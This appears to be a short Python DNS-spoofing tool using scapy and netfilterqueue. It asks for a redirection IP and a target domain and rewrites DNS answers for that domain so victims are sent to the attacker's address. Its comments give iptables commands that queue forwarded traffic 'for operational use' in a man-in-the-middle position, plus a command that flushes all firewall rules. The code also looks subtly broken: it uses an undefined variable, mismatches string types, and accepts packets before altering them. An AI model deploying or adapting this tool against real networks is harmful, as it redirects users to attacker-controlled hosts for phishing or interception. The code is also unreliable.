#!/usr/bin/env python

from scapy.all import *
import netfilterqueue
import subprocess
import time

'''

Prerequisite -> apt-get install build-essential python-dev libnetfilter-queue-dev

--For Local Testing--

Prerequisite -> iptables -I OUTPUT -j NFQUEUE --queue-num 0
Prerequisite -> iptables -I INPUT -j NFQUEUE --queue-num 0

iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0

--For Operational Use--

Prerequisite -> iptables -I FORWARD -j NFQUEUE --queue-num 0

--Purge IPTABLES Queue--

iptables --flush

'''

print("[*] DNS Spoofing Module [*]")
#
alt_host = input("[+] Enter the redirection IP-> ")
#
spoof_target = input("[+] Enter the DNS Spoof Target-> ")

def Process(pkt):
    #
    pkt.accept() # Otherwise, traffic backs up a bit.
    #
    s_pkt = IP(pkt.get_payload())
    #
    if(s_pkt.haslayer(DNSRR)): # DNSRR -> Resource Record
        #                      # DNSQR -> Question Record (Target)
                               # DNSQR -> Question Record QNAME (Target Query)
        tgt_resource = s_pkt[DNSQR].qname
        #
        if(spoof_target in tgt_resource):
            #
            print("[*] Spoofing DNS Request [*]")
            #
            time.sleep(1)
            #
            answer = DNSRR(rrname=qname, rdata=alt_host) # Scapy will autopopulate subordinate fields
            #
            s_pkt[DNS].an = answer
            s_pkt[DNS].ancount = 1
            #
            del s_pkt[IP].len
            del s_pkt[IP].chksum
            del s_pkt[UDP].len
            del s_pkt[UDP].chksum
            #
            pkt .set_payload(str(s_pkt))
            #
            #print(s_pkt.show())
            #
    pkt.accept()

def main():
    #
    q = netfilterqueue.NetfilterQueue() # Instantitate Queue Object
    #
    q.bind(0,Process) # Bind to existing queue : (queue_number,callback_function)
    #
    q.run()

if(__name__ == '__main__'):
    #
    main()
